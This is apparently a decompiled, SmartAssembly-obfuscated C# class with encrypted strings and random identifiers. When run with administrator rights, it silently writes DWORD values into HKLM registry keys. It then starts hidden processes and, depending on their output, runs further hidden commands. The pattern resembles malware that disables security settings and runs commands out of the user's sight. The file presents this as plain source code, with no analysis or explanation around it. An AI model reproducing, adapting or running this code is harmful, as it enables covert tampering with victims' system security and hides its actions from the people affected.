using System;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace nZBhTHSmQawuU;

public static class EKQuebtPcL
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void ashqnNBVmUde()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			IrTTsiCRjdd(getString_0(107370582), getString_0(107370489), getString_0(107396244));
			IrTTsiCRjdd(getString_0(107370464), getString_0(107370403), getString_0(107396197));
			IrTTsiCRjdd(getString_0(107370410), getString_0(107369809), getString_0(107396197));
			IrTTsiCRjdd(getString_0(107370410), getString_0(107369772), getString_0(107396197));
			IrTTsiCRjdd(getString_0(107370410), getString_0(107369703), getString_0(107396197));
			eYOtkgaZSAPNI();
		}
	}

	private static void IrTTsiCRjdd(string string_0, string string_1, string string_2)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(string_0).SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(string_1) != string_2)
			{
				registryKey.SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	private static void eYOtkgaZSAPNI()
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107358241),
			Arguments = getString_0(107369666),
			UseShellExecute = false,
			RedirectStandardOutput = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
		while (!process2.StandardOutput.EndOfStream)
		{
			string text = process2.StandardOutput.ReadLine();
			if (text.StartsWith(getString_0(107369629)) && text.EndsWith(getString_0(107370104)))
			{
				GAVEsyhNQVrVEKm(getString_0(107370127));
			}
			else if (text.StartsWith(getString_0(107369809)) && text.EndsWith(getString_0(107370104)))
			{
				GAVEsyhNQVrVEKm(getString_0(107370058));
			}
			else if (text.StartsWith(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107369957))) && text.EndsWith(getString_0(107370104)))
			{
				GAVEsyhNQVrVEKm(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107369912)));
			}
			else if (text.StartsWith(getString_0(107369311)) && text.EndsWith(getString_0(107370104)))
			{
				GAVEsyhNQVrVEKm(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107369282)));
			}
			else if (text.StartsWith(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107369233))) && text.EndsWith(getString_0(107370104)))
			{
				GAVEsyhNQVrVEKm(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107369200)));
			}
			else if (text.StartsWith(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107369603))) && text.EndsWith(getString_0(107370104)))
			{
				GAVEsyhNQVrVEKm(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107369554)));
			}
			else if (text.StartsWith(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107369429))) && text.EndsWith(getString_0(107370104)))
			{
				GAVEsyhNQVrVEKm(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107369384)));
			}
			else if (text.StartsWith(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107368783))) && text.EndsWith(getString_0(107370104)))
			{
				GAVEsyhNQVrVEKm(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107368722)));
			}
			else if (text.StartsWith(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107368617))) && text.EndsWith(getString_0(107370104)))
			{
				GAVEsyhNQVrVEKm(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107369056)));
			}
			else if (text.StartsWith(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107369007))) && !text.EndsWith(getString_0(107396127)))
			{
				GAVEsyhNQVrVEKm(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107368934)));
			}
			else if (text.StartsWith(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107368857))) && !text.EndsWith(getString_0(107396244)))
			{
				GAVEsyhNQVrVEKm(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107368316)));
			}
			else if (text.StartsWith(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107368255))) && !text.EndsWith(getString_0(107368242)))
			{
				GAVEsyhNQVrVEKm(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107368237)));
			}
			else if (text.StartsWith(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107368144))) && !text.EndsWith(getString_0(107368242)))
			{
				GAVEsyhNQVrVEKm(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107368575)));
			}
			else if (text.StartsWith(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107368486))) && !text.EndsWith(getString_0(107368242)))
			{
				GAVEsyhNQVrVEKm(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107368441)));
			}
			else if (text.StartsWith(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107368396))) && !text.EndsWith(getString_0(107368242)))
			{
				GAVEsyhNQVrVEKm(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107367803)));
			}
		}
	}

	public static void GAVEsyhNQVrVEKm(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107358241),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	static EKQuebtPcL()
	{
		Strings.CreateGetStringDelegate(typeof(EKQuebtPcL));
	}
}
